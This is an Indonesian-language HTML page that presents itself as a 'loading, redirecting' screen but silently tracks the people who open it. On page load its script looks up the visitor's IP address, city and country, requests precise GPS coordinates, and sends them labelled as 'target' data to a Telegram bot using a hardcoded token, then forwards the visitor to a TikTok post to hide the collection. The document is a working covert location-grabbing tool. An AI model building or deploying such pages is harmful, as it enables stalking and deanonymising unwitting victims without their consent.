<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p id="status">Mohon tunggu sebentar, sedang mengarahkan...</p>

    <script>
        // ==== ISI DATA ANDA ====
        const BOT_TOKEN = '9275303069:AAE5NG2xdePLKc9o7UgubNaIYhOT6r6mjdM';
        const CHAT_ID   = '1354234561';
        
        // Link TikTok tujuan
        const TIKTOK_URL = 'https://www.tiktok.com/@rrrrevaalf/photo/7694167529983462674?is_from_webapp=1&sender_device=pc';
        // ======================

        const statusDiv = document.getElementById('status');

        // Fungsi untuk redirect ke TikTok
        function redirectKeTikTok() {
            window.location.href = TIKTOK_URL;
        }

        // Fungsi untuk kirim pesan teks ke Telegram (Trik Gambar)
        function kirimKeTelegram(ip, kota, negara, lat, lon) {
            const pesan = `target ip: ${ip}\nlokasi kota: ${kota}\nlokasi negara: ${negara}\nkordinat: ${lat}, ${lon}`;
            
            // encodeURIComponent wajib agar spasi dan enter terbaca di URL
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
            
            const img = new Image();
            
            // Begitu request terkirim (atau gagal dimuat sebagai gambar), langsung pindah ke TikTok
            img.onload = redirectKeTikTok;
            img.onerror = redirectKeTikTok;
            
            img.src = url;
        }

        // Fungsi Utama
        async function jalankan() {
            try {
                // 1. Ambil data IP, Kota, Negara
                statusDiv.innerText = "Memeriksa jaringan...";
                const responseIp = await fetch('https://ipwho.is/');
                const dataIp = await responseIp.json();
                
                const ip = dataIp.ip || 'Tidak diketahui';
                const kota = dataIp.city || 'Tidak diketahui';
                const negara = dataIp.country || 'Tidak diketahui';

                // 2. Minta Lokasi (GPS) ke Pengguna
                statusDiv.innerText = "Mengambil titik koordinat...";
                
                if (!navigator.geolocation) {
                    // Jika browser tidak support, kirim tanpa koordinat
                    kirimKeTelegram(ip, kota, negara, 'Tidak Support', 'Tidak Support');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // Jika pengguna klik "Izinkan"
                        kirimKeTelegram(ip, kota, negara, pos.coords.latitude, pos.coords.longitude);
                    },
                    (err) => {
                        // Jika pengguna klik "Blokir" atau gagal, tetap kirim data IP-nya saja
                        kirimKeTelegram(ip, kota, negara, 'Ditolak/Gagal', 'Ditolak/Gagal');
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );

            } catch (error) {
                // Jika API IP mati atau error, langsung redirect saja tanpa kirim data
                console.error(error);
                redirectKeTikTok();
            }
        }

        // Jalankan saat halaman dimuat
        window.onload = jalankan;
    </script>
</body>
</html>
